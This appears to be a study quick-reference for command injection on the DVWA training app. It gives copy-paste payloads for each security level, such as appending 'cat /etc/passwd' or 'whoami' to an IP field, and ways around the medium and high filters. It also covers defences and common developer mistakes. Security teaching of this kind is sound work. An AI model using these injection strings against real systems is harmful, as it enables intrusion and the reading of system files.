# Command Injection Practice -- Quick Reference

## DVWA Path

```
/vulnerabilities/exec/
```

---

## Shell Metacharacters

| Character | Name       | Behavior                                              | Example                  |
|-----------|------------|-------------------------------------------------------|--------------------------|
| `;`       | Semicolon  | Execute commands sequentially, regardless of result   | `cmd1; cmd2`             |
| `&&`      | AND        | Execute second command only if first succeeds         | `cmd1 && cmd2`           |
| `\|\|`    | OR         | Execute second command only if first fails            | `cmd1 \|\| cmd2`         |
| `\|`      | Pipe       | Send stdout of first command as stdin to second       | `cmd1 \| cmd2`           |
| `` ` ` `` | Backticks  | Execute enclosed command, substitute its output       | `` echo `whoami` ``      |
| `$()`     | Subshell   | Execute enclosed command, substitute its output       | `echo $(whoami)`         |

---

## Copy-Paste Payloads by Level

### Low Level

```bash
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la /var/www/html
127.0.0.1 && id
127.0.0.1 | uname -a
```

### Medium Level

Filtered: `&&`, `;`

```bash
127.0.0.1 | whoami
127.0.0.1 || whoami
| whoami
```

### High Level

Filtered: `&&`, `;`, `| ` (pipe with trailing space)

```bash
127.0.0.1|whoami
127.0.0.1|cat /etc/passwd
127.0.0.1|id
```

### Impossible Level

All payloads fail. Input is validated and escaped.

---

## Security Level Comparison

| Level      | Filter / Defense                          | Bypass Possible? | Method               |
|------------|-------------------------------------------|------------------|----------------------|
| Low        | None                                      | Yes              | Any metacharacter    |
| Medium     | Strips `&&` and `;`                       | Yes              | `\|` or `\|\|`      |
| High       | Strips `&`, `;`, `\| ` (with space)      | Yes              | `\|` without space   |
| Impossible | `escapeshellarg()` + IP format validation | No               | --                   |

---

## Shell-Invoking Functions by Language

| Language   | Dangerous Functions                                                                    |
|------------|----------------------------------------------------------------------------------------|
| PHP        | `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`, backtick operator (`` ` ` ``) |
| Python     | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, `subprocess.run(shell=True)` |
| Ruby       | `system()`, `exec()`, backticks, `%x{}`, `IO.popen()`, `Open3.capture3()`             |
| Java       | `Runtime.getRuntime().exec()`, `ProcessBuilder`                                        |
| Node.js    | `child_process.exec()`, `child_process.execSync()`                                     |
| Perl       | `system()`, `exec()`, backticks, `open()` with pipe                                   |

---

## Book's Countermeasure Priority (Section 4.11.1)

1. **Do not use shell-invoking functions.** Redesign to avoid spawning a shell entirely.
2. **Use language-native libraries.** Replace shell commands with equivalent API calls (e.g., use PHP socket functions instead of calling `ping` via `system()`).
3. **Do not pass external input to shell commands.** If a shell must be used, hardcode arguments or use an allowlist of predefined values.
4. **Use `escapeshellarg()`.** As a last resort, escape all user-supplied arguments before passing them to the shell. Never use `escapeshellcmd()` alone -- it does not prevent argument injection.

---

## Common Mistakes

- **Blacklist filtering:** Trying to strip dangerous characters one by one. There are always characters or encodings the developer forgets. The Medium and High levels in DVWA demonstrate this perfectly.
- **Filtering with spaces in patterns:** The High level filters `"| "` (pipe-space) but not `"|"` (bare pipe). Attackers simply remove the space.
- **Using `escapeshellcmd()` instead of `escapeshellarg()`:** `escapeshellcmd()` escapes shell metacharacters but still allows argument injection. `escapeshellarg()` wraps the entire input in quotes, which is the correct approach.
- **Trusting client-side validation:** JavaScript validation on the front end is trivially bypassed. All validation must happen server-side.
- **Assuming the web server user has limited access:** Even a low-privilege user like `www-data` can read sensitive files, enumerate the system, and potentially escalate privileges.

---

## Book Chapter Reference

- **Section 4.11** -- OS Command Injection
- **Section 4.11.1** -- Countermeasures for OS Command Injection
